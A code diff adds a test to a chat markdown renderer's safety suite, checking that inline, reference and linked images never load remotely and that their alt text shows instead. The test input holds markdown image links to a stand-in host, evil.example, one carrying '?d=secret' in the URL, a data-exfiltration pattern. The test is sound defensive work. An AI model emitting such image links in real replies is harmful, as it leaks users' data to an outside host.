@@ -61,4 +61,12 @@ describe("ChatMarkdown safety", () => {
     expect(screen.queryByRole("link")).toBeNull();
     expect(screen.getByText("bad")).toBeInTheDocument();
   });
+
+  it("never loads a remote image: the alt text shows instead (markdown images are a tracking channel)", () => {
+    const md = "![chart](https://evil.example/t.png?d=secret)\n\n![ref][r]\n\n[![linked](https://evil.example/b.png)](https://example.com)\n\n[r]: https://evil.example/r.png";
+    const { container } = render(<ChatMarkdown text={md} />);
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.textContent).toContain("chart");
+    expect(container.textContent).toContain("linked");
+  });
 });
